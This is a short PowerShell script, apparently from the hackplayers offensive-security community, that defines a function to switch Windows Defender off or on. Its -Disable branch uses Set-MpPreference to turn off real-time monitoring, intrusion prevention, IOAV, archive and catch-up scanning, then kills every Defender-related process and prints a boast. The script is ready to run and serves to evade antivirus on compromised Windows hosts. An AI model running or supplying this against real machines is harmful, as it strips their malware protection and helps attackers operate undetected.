function Set-WindowsDenfender {param ([switch]$Enable,[switch]$Disable)

$resultado = "
  _________       __             __      __.__            .___                  ________          _____                  .___            
 /   _____/ _____/  |_          /  \    /  \__| ____    __| _/______  _  _______\______ \   _____/ ____\____   ____    __| _/___________ 
 \_____  \_/ __ \   __\  ______ \   \/\/   /  |/    \  / __ |/  _ \ \/ \/ /  ___/|    |  \_/ __ \   __\/ __ \ /    \  / __ |/ __ \_  __ \
 /        \  ___/|  |   /_____/  \        /|  |   |  \/ /_/ (  <_> )     /\___ \ |    `   \  ___/|  | \  ___/|   |  \/ /_/ \  ___/|  | \/
/_______  /\___  >__|             \__/\  / |__|___|  /\____ |\____/ \/\_//____  >_______  /\___  >__|  \___  >___|  /\____ |\___  >__|   
        \/     \/                      \/          \/      \/                 \/        \/     \/          \/     \/      \/    \/                                                                                                    
                                               cybervaca @ hackplayers                                                                                                     
"

if ($Disable -eq $True) {
Set-MpPreference -DisableIOAVProtection $True
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
Set-MpPreference -DisableCatchupQuickScan $True
Set-MpPreference -DisableArchiveScanning $True
Get-Process | Select-Object -Property * | Where-Object {$_.Description -like "*defender*"} | Stop-Process
$resultado += "[+] Windows Defender right now is Disabled :D"
return $resultado
}

if ($Enable -eq $True) {
$proceso = 'C:\Program Files\Windows Defender\MSASCui.exe'
$startExe = New-Object System.Diagnostics.ProcessStartInfo 
$startExe.WindowStyle = "hidden"
$startExe.FileName = $proceso
[System.Diagnostics.Process]::Start($startExe) | Out-Null
Set-MpPreference -DisableIOAVProtection $False
Set-MpPreference -DisableRealtimeMonitoring $False
Set-MpPreference -DisableIntrusionPreventionSystem $False
Set-MpPreference -DisableCatchupQuickScan $False
Set-MpPreference -DisableArchiveScanning $False
$resultado += "[+] Windows Defender right now is Enabled"
return $resultado
}

if ($Enable -eq $False -and $Disable -eq $False){
if ((Get-Process -Name MSASCUI -ErrorAction SilentlyContinue).count -ge 1 ) {$resultado += "[+] Windows Defender is Enabled"} else {$resultado += "[+] Windows Defender is Disabled"}
return $resultado
}}
